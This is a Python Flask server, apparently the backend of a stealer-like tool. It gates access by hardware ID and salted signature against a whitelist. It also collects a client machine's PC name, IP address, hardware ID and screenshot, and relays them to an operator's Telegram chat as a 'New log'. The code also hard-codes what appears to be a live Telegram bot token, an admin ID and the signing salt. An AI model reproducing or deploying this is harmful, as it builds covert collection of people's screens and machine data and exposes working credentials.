from flask import Flask, request, jsonify
import hashlib
import requests
import os

app = Flask(__name__)

TG_TOKEN = "7932064207:AAF5bvxFzjlPnmu053jEwlYWtDP7zQ1Wrac"
ADMIN_ID = "8161820784"
SECRET_SALT = "NixBones_Render_2026" 
WHITELIST = ["7C1C98FC32FEAB8EEDDE92ACE8893C4DC342CBAC550548FCC37E417C8DF2F70C"]

@app.route('/check', methods=['POST'])
def check():
    data = request.json
    hwid = data.get("hwid", "").strip()
    client_sig = data.get("sig", "").strip()
    expected_sig = hashlib.sha256((hwid + SECRET_SALT).encode()).hexdigest()

    if client_sig == expected_sig and hwid in WHITELIST:
        return jsonify({"status": "granted"}), 200
    return jsonify({"status": "denied"}), 403

@app.route('/log_info', methods=['POST'])
def log_info():
    try:
        hwid = request.form.get("hwid")
        pc_name = request.form.get("pc_name")
        ip = request.form.get("ip")
        photo = request.files.get("screenshot")

        caption = (f"👤 <b>Новый лог:</b>\n"
                   f"💻 Имя ПК: <code>{pc_name}</code>\n"
                   f"🔑 HWID: <code>{hwid}</code>\n"
                   f"🌍 IP: <code>{ip}</code>")

        url = f"https://api.telegram.org/bot{TG_TOKEN}/sendPhoto"
        files = {'photo': ('s.png', photo.read(), 'image/png')}
        requests.post(url, data={"chat_id": ADMIN_ID, "caption": caption, "parse_mode": "HTML"}, files=files)
        return jsonify({"status": "ok"}), 200
    except:
        return jsonify({"status": "error"}), 500
